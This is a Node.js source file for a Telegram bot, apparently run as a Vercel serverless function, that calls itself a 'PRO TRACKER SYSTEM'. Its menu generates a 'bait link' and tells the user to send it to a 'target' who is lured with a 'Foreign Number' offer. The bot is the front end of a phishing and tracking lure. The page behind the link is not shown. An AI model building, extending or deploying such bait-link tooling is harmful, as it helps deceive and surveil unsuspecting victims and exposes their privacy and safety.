const { Telegraf, Markup } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);
const OWNER_ID = process.env.OWNER_ID;

// Start command
bot.start((ctx) => {
    const mainMenu = Markup.inlineKeyboard([
        [Markup.button.callback('🎱 Pool Tracking', 'gen_pool')],
        [Markup.button.callback('⚡ Normal Tracking', 'gen_normal')],
        [Markup.button.callback('👨‍💻 Developer', 'dev')],
        [Markup.button.url('🌐 Bot Support', 'https://t.me/Mrddev')]
    ]);

    ctx.replyWithPhoto(
        "https://files.catbox.moe/v75lmb.jpeg",
        {
            caption: `<b>🔱 PRO TRACKER SYSTEM v3.0</b>
──────────────────────────
Select a mode to generate your tracking link:

🎯 Choose wisely and stay sharp.`,
            parse_mode: 'HTML',
            ...mainMenu
        }
    );
});

// Developer button
bot.action('dev', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply("👨‍💻 Developer: @Mrddev\n💻 Always online for support.");
});

// Pool / Normal tracking buttons with animation
bot.action(['gen_pool', 'gen_normal'], async (ctx) => {
    const mode = ctx.match[0] === 'gen_pool' ? 'POOL' : 'NORMAL';
    const baitUrl = `https://${process.env.VERCEL_URL}/`;

    // Step 1: Show "Generating link..." animation
    const generatingMsg = await ctx.reply(`🔄 <b>${mode} MODE</b> — Generating your bait link...`, { parse_mode: 'HTML' });

    // Step 2: Wait a bit (animation)
    await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds

    // Step 3: Edit message with the real link
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        generatingMsg.message_id,
        undefined,
        `✅ <b>${mode} MODE ACTIVATED</b>
──────────────────────────
<b>Your Bait Link:</b>
<code>${baitUrl}</code>

<i>Send this to the target to claim their "Foreign Number".</i>`,
        {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Back', 'back')]])
        }
    );
});

// Back button
bot.action('back', async (ctx) => {
    const mainMenu = Markup.inlineKeyboard([
        [Markup.button.callback('🎱 Pool Tracking', 'gen_pool')],
        [Markup.button.callback('⚡ Normal Tracking', 'gen_normal')],
        [Markup.button.callback('👨‍💻 Developer', 'dev')],
        [Markup.button.url('🌐 Bot Support', 'https://t.me/Mrddev')]
    ]);

    await ctx.editMessageText(
        `<b>🔱 PRO TRACKER SYSTEM v3.0</b>
──────────────────────────
Select a mode to generate your tracking link:

🎯 Choose wisely and stay sharp.`,
        {
            parse_mode: 'HTML',
            ...mainMenu
        }
    );
});

// Vercel serverless function
module.exports = async (req, res) => {
    if (req.method === 'POST') {
        try {
            await bot.handleUpdate(req.body);
            res.status(200).send('OK');
        } catch (err) {
            console.error(err);
            res.status(500).send('Error handling update');
        }
    } else {
        res.status(200).send('Bot is running...');
    }
};
